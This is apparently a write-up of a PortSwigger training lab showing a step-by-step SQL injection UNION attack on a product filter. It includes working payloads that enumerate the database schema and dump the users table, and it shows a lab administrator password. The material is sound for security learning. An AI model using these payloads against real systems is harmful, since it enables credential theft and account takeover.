# SQL injection UNION attack, retrieving data from other tables

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables), you'll learn: SQL injection UNION attack, retrieving data from other tables! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204022006.png)

In the previous labs, we found that **the product category `filter` is vulnerable to SQL injection**, and **the query is being reflected to the application's response**.

**Now, let's enumerate the number of columns in this table via `UNION` clause!**
```sql
' UNION SELECT NULL,NULL,NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204022316.png)

**When we try to select 3 columns, it returns a `500 Internal Server Error` HTTP status, which means this database table has no 3 columns.**

**How about 2 columns?**
```sql
' UNION SELECT NULL,NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204022429.png)

No error this time!

**Next, we need to enumerate which column accepts string datatype:**
```sql
' UNION SELECT 'SQL Injection 1','SQL Injection 2'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204022528.png)

**We can see that all columns accept string datatype!**

- First column: Header
- Second column: article content

**Then, we need to find out which DBMS(Database Management System) is using:**
```sql
' UNION SELECT NULL,version()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204022746.png)

- DBMS information: **PostgreSQL version 12.12**

> Note: Although the lab background gave us the table name and column names, I wanna practice SQL injection without anything information in advance.

**After that, we try to enumerate the current table data!**

**According to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-database) about PostgreSQL injection, we can list all the database names:** 
```sql
' UNION SELECT NULL,datname FROM pg_database-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204023527.png)

- Databases: `template1`, `academy_labs`, `postgres`, `template0`

**Looks like `academy_labs` is our current database? Let's check it is true:**
```sql
' UNION SELECT NULL,current_database()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204023709.png)

**Yep, let's list all the table names in this database!**
```sql
' UNION SELECT NULL,table_name FROM information_schema.tables-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204024437.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204024452.png)

**The `users` table looks interesting! Let's enumerate it's column names:**
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204024620.png)

- Table `users` column names: `password`, `username`

**Sounds very interesting! Let's list all the data in this table!**
```sql
' UNION SELECT username,password FROM users-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204024743.png)

Nice! **We found all the users' name and password in plaintext**!!

**Now, our objective is log in as `administrator` user.**

Armed with above information, **we know that it's username and password is `administrator:n84eoukut9lau0n2n4s2`!**

**Let's login as `administrator` then!** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204024943.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204025015.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-5/images/Pasted%20image%2020221204025025.png)

We're successfully logged in as `administrator`!!

# Conclusion

What we've learned:

1. SQL injection UNION attack, retrieving data from other tables